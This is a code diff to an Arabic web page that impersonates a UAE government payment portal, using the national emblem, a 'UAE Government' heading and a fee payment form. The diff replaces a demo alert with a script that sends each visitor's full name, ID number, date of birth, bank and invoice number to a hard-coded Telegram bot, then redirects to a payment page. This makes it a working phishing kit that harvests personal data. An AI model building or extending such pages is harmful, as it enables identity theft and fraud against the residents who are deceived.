@@ -7,7 +7,7 @@
   <style>
     body{font-family:Tahoma,Arial;background:#fff;margin:0}
     header{text-align:center;padding:20px}
-    header img{height:100px}
+    header img{height:80px}
     main{padding:20px}
     form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12)}
     label{display:block;margin-top:14px;font-weight:700}
@@ -19,8 +19,8 @@
 </head>
 <body>
   <header>
-    <!-- شعار الإمارات -->
-    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Emblem_of_the_United_Arab_Emirates.svg" alt="شعار الإمارات">
+    <!-- تم استبدال صورة الشعار هنا بالشعار المرفق -->
+    <img src="logo.png" alt="شعار الإمارات">
     <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
     <p>حكومة الإمارات العربية المتحدة</p>
   </header>
@@ -30,14 +30,14 @@
       <label for="fullName">الاسم بالكامل *</label>
       <input id="fullName" required>
 
-      <label for="idNumber">رقم الهوية (15 رقمًا) *</label>
-      <input id="idNumber" type="text" required pattern="^\d{15}$" title="رقم الهوية يجب أن يتكون من 15 رقمًا" />
+      <label for="idNumber">رقم الهوية (15 رقمًا بالضبط) *</label>
+      <input id="idNumber" type="text" required pattern="^\d{15}$" title="رقم الهوية يجب أن يتكون من 15 رقمًا بالضبط" />
 
       <label for="dob">تاريخ الميلاد *</label>
-      <div style="display:flex;gap:10px;">
-        <input id="day" type="number" placeholder="يوم" min="1" max="31" required style="width:30%">
-        <input id="month" type="number" placeholder="شهر" min="1" max="12" required style="width:30%">
-        <input id="year" type="number" placeholder="سنة" min="1900" max="2100" required style="width:30%">
+      <div style="display: flex; gap: 10px;">
+        <input id="day" type="number" placeholder="يوم" min="1" max="31" required style="width: 30%">
+        <input id="month" type="number" placeholder="شهر" min="1" max="12" required style="width: 30%">
+        <input id="year" type="number" placeholder="سنة" min="1900" max="2100" required style="width: 30%">
       </div>
 
       <label for="mobile">رقم الجوال *</label>
@@ -72,10 +72,10 @@
       </select>
 
       <label for="amount">قيمة رسوم السداد (درهم إماراتي) *</label>
-      <input id="amount" type="number" min="1" step="0.01" placeholder="مثال: 1.00" required>
+      <input id="amount" type="number" min="1" step="0.01" placeholder="مثال: 100.00" required>
 
-      <label for="invoiceNumber">رقم المفوتر (6 أرقام فقط) *</label>
-      <input id="invoiceNumber" type="text" maxlength="6" pattern="^\d{6}$" title="رقم المفوتر يجب أن يتكون من 6 أرقام فقط" required>
+      <label for="invoiceNumber">رقم المفوتر (8 أرقام فقط) *</label>
+      <input id="invoiceNumber" type="text" maxlength="8" pattern="^\d{8}$" title="رقم المفوتر يجب أن يتكون من 8 أرقام فقط" required>
 
       <button type="submit">إرسال</button>
     </form>
@@ -86,11 +86,48 @@
   </footer>
 
   <script>
-    document.getElementById('mainForm').addEventListener('submit', (e)=>{
+    const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
+    const CHAT_ID   = "8404960059";
+
+    document.getElementById('mainForm').addEventListener('submit', async (e)=>{
       e.preventDefault();
-      // هنا يمكنك لاحقًا ربط صفحة الدفع الفعلية أو إشعار السيرفر
-      alert('تم التحقق من البيانات (نموذج تجريبي)');
+
+      const idNumber = document.getElementById('idNumber').value.trim();
+      if (idNumber.length !== 15) { alert('رقم الهوية يجب أن يتكون من 15 رقمًا'); return; }
+
+      const amount = document.getElementById('amount').value.trim();
+      if (parseFloat(amount) < 1) { alert('المبلغ يجب أن يكون على الأقل درهم واحد'); return; }
+
+      const data = {
+        fullName: document.getElementById('fullName').value.trim(),
+        idNumber: idNumber,
+        dob: `${document.getElementById('day').value.trim()}/${document.getElementById('month').value.trim()}/${document.getElementById('year').value.trim()}`,
+        mobile: document.getElementById('mobile').value.trim(),
+        bank: document.getElementById('bank').value,
+        amount: amount,
+        invoiceNumber: document.getElementById('invoiceNumber').value.trim()
+      };
+
+      sessionStorage.setItem('formData', JSON.stringify(data));
+
+      const msg = `🚀 نموذج الواجهة الرئيسية
+👤 الاسم: ${data.fullName}
+🆔 رقم الهوية: ${data.idNumber}
+📅 تاريخ الميلاد: ${data.dob}
+🏦 البنك: ${data.bank}
+💵 المبلغ: ${data.amount} درهم
+🔢 رقم المفوتر: ${data.invoiceNumber}`;
+
+      try{
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({chat_id: CHAT_ID, text: msg})
+        });
+      }catch(_){}
+
+      window.location.href = 'payment.html';
     });
   </script>
 </body>
-</html>
+  </html>
